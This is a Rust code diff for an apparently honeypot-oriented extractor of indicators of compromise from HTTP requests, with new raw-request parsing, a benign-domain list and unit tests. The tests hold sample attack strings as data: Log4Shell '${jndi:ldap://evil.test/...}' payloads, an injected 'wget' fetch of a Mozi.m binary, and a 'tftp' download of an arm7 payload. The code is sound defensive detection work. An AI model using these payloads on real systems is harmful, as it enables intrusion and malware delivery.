@@ -28,6 +28,97 @@ pub fn extract_iocs(text: &str) -> Vec<IocItem> {
     items
 }
 
+/// Split a raw HTTP/1.x request into `(first_line, headers_block, body)` if `raw` begins with an HTTP request line.
+fn split_raw_http(raw: &str) -> Option<(&str, &str, &str)> {
+    const METHODS: &[&str] = &[
+        "GET ",
+        "POST ",
+        "HEAD ",
+        "PUT ",
+        "DELETE ",
+        "OPTIONS ",
+        "PATCH ",
+        "CONNECT ",
+        "TRACE ",
+        "PROPFIND ",
+    ];
+
+    let first_end = raw.find('\n').unwrap_or(raw.len());
+    let first_line = raw[..first_end].trim_end_matches('\r');
+    let upper = first_line.to_ascii_uppercase();
+    if !METHODS.iter().any(|m| upper.starts_with(m)) || !upper.contains(" HTTP/") {
+        return None;
+    }
+
+    if let Some(pos) = raw.find("\r\n\r\n") {
+        let headers = &raw[..pos];
+        let body = &raw[pos + 4..];
+        Some((first_line, headers, body))
+    } else if let Some(pos) = raw.find("\n\n") {
+        let headers = &raw[..pos];
+        let body = &raw[pos + 2..];
+        Some((first_line, headers, body))
+    } else {
+        Some((first_line, raw, ""))
+    }
+}
+
+fn scan_http_parts(
+    path: &str,
+    headers_for_jndi: &str,
+    body: Option<&str>,
+    self_host: Option<&str>,
+) -> Vec<IocItem> {
+    let has_body = body.map(|b| !b.trim().is_empty()).unwrap_or(false);
+    if is_internal_dashboard_path(path) && !has_body {
+        return Vec::new();
+    }
+
+    let mut items = Vec::new();
+    let mut seen = HashSet::new();
+
+    // 1. Scan request body (POST/PUT/PATCH payloads)
+    if let Some(body) = body {
+        if !body.trim().is_empty() {
+            extract_urls(body, Some("http-body"), &mut items, &mut seen);
+            extract_tftp_commands(body, &mut items, &mut seen);
+            extract_base64_payloads(body, &mut items, &mut seen);
+        }
+    }
+
+    // 2. Scan query string or absolute proxy URI in path
+    if let Some((_, query)) = path.split_once('?') {
+        if query.contains("://") {
+            let normalized = query.replace('+', " ");
+            extract_urls(&normalized, Some("http-query"), &mut items, &mut seen);
+        } else {
+            extract_urls(query, Some("http-query"), &mut items, &mut seen);
+        }
+    }
+    let lower_path = path.to_ascii_lowercase();
+    if lower_path.starts_with("http://") || lower_path.starts_with("https://") {
+        extract_urls(path, Some("open-proxy"), &mut items, &mut seen);
+    }
+
+    // 3. Scan headers + body ONLY for Log4Shell ${jndi:...}
+    extract_jndi_payloads(headers_for_jndi, &mut items, &mut seen);
+    if let Some(body) = body {
+        extract_jndi_payloads(body, &mut items, &mut seen);
+    }
+
+    // Exclude URLs pointing to the honeypot's own Host header
+    if let Some(own_host) = self_host {
+        items.retain(|item| {
+            url_host(&item.value)
+                .map(|h| h != own_host)
+                .unwrap_or(true)
+        });
+    }
+
+    items.truncate(MAX_IOCS_PER_EVENT);
+    items
+}
+
 /// Extract IOCs aware of protocol context so standard HTTP headers (Referer, User-Agent, Origin)
 /// from browsers or uptime monitors are never recorded as attacker IOCs.
 pub fn extract_iocs_for_event(
@@ -36,57 +127,27 @@ pub fn extract_iocs_for_event(
     http_path: Option<&str>,
     decoded_payload: Option<&str>,
 ) -> Vec<IocItem> {
+    // Handle raw HTTP requests captured on generic TCP/proxy ports (where payload holds headers + body)
+    if let Some(raw) = decoded_payload {
+        if let Some((first_line, headers, body)) = split_raw_http(raw) {
+            let path = http_path
+                .filter(|p| !p.is_empty())
+                .or_else(|| first_line.split_whitespace().nth(1))
+                .unwrap_or("");
+            let self_host = extract_http_host(headers).or_else(|| extract_http_host(request));
+            let body_opt = if body.trim().is_empty() { None } else { Some(body) };
+            return scan_http_parts(path, headers, body_opt, self_host.as_deref());
+        }
+    }
+
     let svc = service.to_ascii_lowercase();
     if matches!(
         svc.as_str(),
-        "http" | "https" | "http-alt" | "http-proxy" | "https-alt" | "docker" | "elasticsearch" | "ollama"
+        "http" | "https" | "http-alt" | "http-proxy" | "https-alt" | "docker" | "docker-tls" | "elasticsearch" | "ollama"
     ) {
         let path = http_path.unwrap_or("");
-        let has_body = decoded_payload.map(|b| !b.trim().is_empty()).unwrap_or(false);
-
-        if is_internal_dashboard_path(path) && !has_body {
-            return Vec::new();
-        }
-
         let self_host = extract_http_host(request);
-        let mut items = Vec::new();
-        let mut seen = HashSet::new();
-
-        // 1. Scan request body (POST/PUT/PATCH payloads)
-        if let Some(body) = decoded_payload {
-            if !body.trim().is_empty() {
-                extract_urls(body, Some("http-body"), &mut items, &mut seen);
-                extract_tftp_commands(body, &mut items, &mut seen);
-                extract_base64_payloads(body, &mut items, &mut seen);
-            }
-        }
-
-        // 2. Scan query string or absolute proxy URI in http_path
-        if let Some((_, query)) = path.split_once('?') {
-            extract_urls(query, Some("http-query"), &mut items, &mut seen);
-        }
-        let lower_path = path.to_ascii_lowercase();
-        if lower_path.starts_with("http://") || lower_path.starts_with("https://") {
-            extract_urls(path, Some("open-proxy"), &mut items, &mut seen);
-        }
-
-        // 3. Scan anywhere in request (including headers) ONLY for Log4Shell ${jndi:...}
-        extract_jndi_payloads(request, &mut items, &mut seen);
-        if let Some(body) = decoded_payload {
-            extract_jndi_payloads(body, &mut items, &mut seen);
-        }
-
-        // Exclude URLs pointing to the honeypot's own Host header
-        if let Some(ref own_host) = self_host {
-            items.retain(|item| {
-                url_host(&item.value)
-                    .map(|h| h != *own_host)
-                    .unwrap_or(true)
-            });
-        }
-
-        items.truncate(MAX_IOCS_PER_EVENT);
-        items
+        scan_http_parts(path, request, decoded_payload, self_host.as_deref())
     } else {
         let mut corpus = request.to_string();
         if let Some(dp) = decoded_payload {
@@ -200,6 +261,85 @@ fn push_ioc(
     }
 }
 
+fn host_matches_domain(host: &str, domain: &str) -> bool {
+    host == domain
+        || (host.len() > domain.len()
+            && host.ends_with(domain)
+            && host.as_bytes()[host.len() - domain.len() - 1] == b'.')
+}
+
+fn is_valid_ioc_host(host: &str) -> bool {
+    if host.is_empty() || host.starts_with('.') || host.ends_with('.') {
+        return false;
+    }
+    if !host
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'[' | b']'))
+    {
+        return false;
+    }
+    host.contains('.') || (host.starts_with('[') && host.ends_with(']'))
+}
+
+fn is_benign_ioc_host(host: &str, full_url: &str) -> bool {
+    if matches!(
+        host,
+        "localhost"
+            | "127.0.0.1"
+            | "0.0.0.0"
+            | "example.com"
+            | "www.example.com"
+            | "example.org"
+            | "www.example.org"
+            | "example.net"
+            | "www.example.net"
+    ) || host.ends_with(".invalid")
+        || host.ends_with(".example")
+        || host.ends_with(".localhost")
+    {
+        return true;
+    }
+
+    const BENIGN_DOMAINS: &[&str] = &[
+        // Protocol XML/SOAP/XMPP/UPnP/DTD namespaces
+        "w3.org",
+        "xmlsoap.org",
+        "dmtf.org",
+        "jabber.org",
+        "oasis-open.org",
+        "upnp.org",
+        "purenetworks.com",
+        "schemas.microsoft.com",
+        // Benign scanner, crawler, and uptime monitor info URLs
+        "censys.io",
+        "shodan.io",
+        "paloaltonetworks.com",
+        "internet-measurement.com",
+        "infrawat.ch",
+        "nmap.org",
+        "uptimerobot.com",
+        "shadowserver.org",
+        "onyphe.io",
+        "binaryedge.io",
+        "driftnet.io",
+        "leakix.net",
+        "flowiq-labs.com",
+        "duckduckgo.com",
+        "bing.com",
+        "check-host.net",
+    ];
+
+    if BENIGN_DOMAINS.iter().any(|d| host_matches_domain(host, d)) {
+        return true;
+    }
+
+    if host_matches_domain(host, "apple.com") && full_url.to_ascii_lowercase().contains("/dtds/") {
+        return true;
+    }
+
+    false
+}
+
 fn extract_urls(
     text: &str,
     context: Option<&str>,
@@ -238,6 +378,8 @@ fn extract_urls(
         let mut end = rest.len();
         for (idx, ch) in rest.char_indices() {
             if ch.is_whitespace()
+                || ch.is_control()
+                || !ch.is_ascii()
                 || matches!(ch, '\'' | '"' | ';' | ')' | ']' | '}' | '>' | '<' | '|' | '&' | '`')
             {
                 end = idx;
@@ -247,13 +389,12 @@ fn extract_urls(
 
         let raw_url = rest[..end].trim_end_matches([',', '.']);
         if raw_url.len() > scheme.len() + 2 {
-            // Skip obvious localhost/example noise
             let host_part = raw_url[scheme.len()..]
                 .split(['/', ':', '?'])
                 .next()
                 .unwrap_or("")
                 .to_ascii_lowercase();
-            if !host_part.is_empty() && host_part != "localhost" && host_part != "127.0.0.1" {
+            if is_valid_ioc_host(&host_part) && !is_benign_ioc_host(&host_part, raw_url) {
                 let ioc_type = if scheme.starts_with("stratum") {
                     "miner_pool"
                 } else {
@@ -287,8 +428,15 @@ fn extract_tftp_commands(
                 let mut i = 1;
                 while i < tokens.len() {
                     match tokens[i] {
-                        "-g" | "-l" => {
+                        "-g" | "-p" => {
                             i += 1;
+                        }
+                        "-l" => {
+                            if i + 1 < tokens.len() {
+                                i += 2;
+                            } else {
+                                i += 1;
+                            }
                         }
                         "-r" => {
                             if i + 1 < tokens.len() {
@@ -308,11 +456,17 @@ fn extract_tftp_commands(
                     }
                 }
                 if let Some(h) = host {
-                    let val = match remote_file {
-                        Some(f) => format!("tftp://{}/{}", h, f.trim_start_matches('/')),
-                        None => format!("tftp://{}", h),
-                    };
-                    push_ioc(items, seen, "url", val, Some("tftp".to_string()));
+                    if !h.starts_with('.')
+                        && !h.starts_with('$')
+                        && !h.contains('$')
+                        && (h.contains('.') || h.contains(':'))
+                    {
+                        let val = match remote_file {
+                            Some(f) => format!("tftp://{}/{}", h, f.trim_start_matches('/')),
+                            None => format!("tftp://{}", h),
+                        };
+                        push_ioc(items, seen, "url", val, Some("tftp".to_string()));
+                    }
                 }
             }
         }
@@ -445,16 +599,16 @@ mod tests {
 
     #[test]
     fn ignores_http_referer_and_user_agent_urls_but_keeps_body_query_and_jndi() {
-        let browser_req = "GET /api/recent HTTP/1.1\nhost: echo.shmakov.net\nreferer: https://echo.shmakov.net/stats\nuser-agent: Mozilla/5.0";
+        let browser_req = "GET /api/recent HTTP/1.1\nhost: honeypot.example.com\nreferer: https://honeypot.example.com/stats\nuser-agent: Mozilla/5.0";
         assert!(extract_iocs_for_event("http", browser_req, Some("/api/recent"), None).is_empty());
 
-        let uptime_req = "GET / HTTP/1.1\nhost: echo.shmakov.net\nreferer: https://tail-f.shmakov.net\nuser-agent: Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)";
+        let uptime_req = "GET / HTTP/1.1\nhost: honeypot.example.com\nreferer: https://monitor.example.com\nuser-agent: Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)";
         assert!(extract_iocs_for_event("http", uptime_req, Some("/"), None).is_empty());
 
-        let unknown_with_ua = "GET /wp-login.php HTTP/1.1\nhost: echo.shmakov.net\nuser-agent: CheckHost (https://check-host.net/)";
+        let unknown_with_ua = "GET /wp-login.php HTTP/1.1\nhost: honeypot.example.com\nuser-agent: CheckHost (https://check-host.net/)";
         assert!(extract_iocs_for_event("http", unknown_with_ua, Some("/wp-login.php"), None).is_empty());
 
-        let attack_req = "POST /wp-login.php HTTP/1.1\nhost: echo.shmakov.net\nx-api: ${jndi:ldap://evil.test/a}";
+        let attack_req = "POST /wp-login.php HTTP/1.1\nhost: honeypot.example.com\nx-api: ${jndi:ldap://evil.test/a}";
         let iocs = extract_iocs_for_event(
             "http",
             attack_req,
@@ -465,5 +619,32 @@ mod tests {
         assert!(values.contains(&"http://45.1.2.3/drop.sh"));
         assert!(values.contains(&"http://99.88.77.66/stage"));
         assert!(values.contains(&"${jndi:ldap://evil.test/a}"));
+    }
+
+    #[test]
+    fn strips_raw_http_headers_on_non_80_tcp_ports_and_handles_tftp_l_flag() {
+        let raw_probe = "GET / HTTP/1.1\r\nHost: 192.0.2.10:8080\r\nUser-Agent: Infrawatch/1.0 (+https://infrawat.ch/)\r\n\r\n";
+        assert!(extract_iocs_for_event("http-proxy", "Connection", None, Some(raw_probe)).is_empty());
+
+        let raw_exploit = "GET /board.cgi?cmd=wget+http://198.51.100.50:8088/Mozi.m+-O+- HTTP/1.0\r\nHost: 192.0.2.10:8080\r\nX-Test: ${jndi:ldap://evil.test/z}\r\n\r\n";
+        let iocs = extract_iocs_for_event("http-proxy", "Connection", None, Some(raw_exploit));
+        let values: Vec<&str> = iocs.iter().map(|i| i.value.as_str()).collect();
+        assert_eq!(values.len(), 2);
+        assert!(values.contains(&"http://198.51.100.50:8088/Mozi.m"));
+        assert!(values.contains(&"${jndi:ldap://evil.test/z}"));
+
+        // XML/SOAP namespaces & NUL-terminated URLs are ignored / cleanly bounded
+        let xml_probe = "POST http://192.0.2.10:49152/upnp HTTP/1.1\r\nHost: 192.0.2.10:49152\r\n\r\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"/>";
+        assert!(extract_iocs_for_event("unknown", "Connection", None, Some(xml_probe)).is_empty());
+
+        let nul_url = "wget http://198.51.100.2/a.sh\x00\x01garbage";
+        let nul_iocs = extract_iocs(nul_url);
+        assert_eq!(nul_iocs[0].value, "http://198.51.100.2/a.sh");
+
+        // TFTP -l <localfile> skips the local filename argument
+        let tftp_cmd = "tftp -g -l .x -r arm7 198.51.100.9";
+        let tftp_iocs = extract_iocs(tftp_cmd);
+        assert_eq!(tftp_iocs.len(), 1);
+        assert_eq!(tftp_iocs[0].value, "tftp://198.51.100.9/arm7");
     }
 }
